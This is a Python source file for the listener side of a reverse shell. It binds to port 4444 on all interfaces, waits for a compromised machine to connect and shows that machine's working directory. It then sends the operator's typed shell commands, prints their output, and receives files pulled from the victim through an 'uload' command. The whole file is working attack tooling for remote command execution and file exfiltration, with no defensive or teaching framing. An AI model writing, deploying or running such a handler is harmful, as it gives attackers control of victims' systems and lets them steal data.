import socket
import argparse
import tqdm
import psutil
import os

# ANSI COLOR CODES
# ================
class tcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ARGUMENT FLAGS
# ============== 
parser = argparse.ArgumentParser()
parser.add_argument("-l", dest="Host", default="0.0.0.0", help="set the host")
parser.add_argument("-p", dest="Port", default=4444, help="set the port")
args = parser.parse_args()
args.Port = int(args.Port) #Port must be of type<'int'>

# GLOBAL VARIABLES
# ================
S_HOST = args.Host 
S_PORT = args.Port
BUFFER_SIZE = 1024 * 320 #Size of Buffer-> 320KB
SEPERATOR = "<sep>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((S_HOST, S_PORT))

s.listen(5)
print(f"Listening as {S_HOST}:{S_PORT}...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current Working Directory: ", cwd)

while True:
    cmd = input(f"{cwd} $> ")
    if not cmd.strip():
        continue
    client_socket.send(cmd.encode())
    if cmd.lower() == "exit":
        break
    if cmd.lower() == "uload":
        recieved = client_socket.recv(BUFFER_SIZE).decode()
        filename, filesize = recieved.split(SEPERATOR)
        filename = os.path.basename(filename)
        filesize = int(filesize)

        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
            while True:
                bytes_read = client_socket.recv(BUFFER_SIZE)
                if not bytes_read:
                    break
                f.write(bytes_read)
                progress.update(len(bytes_read))
        continue

    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPERATOR)
    print(results)


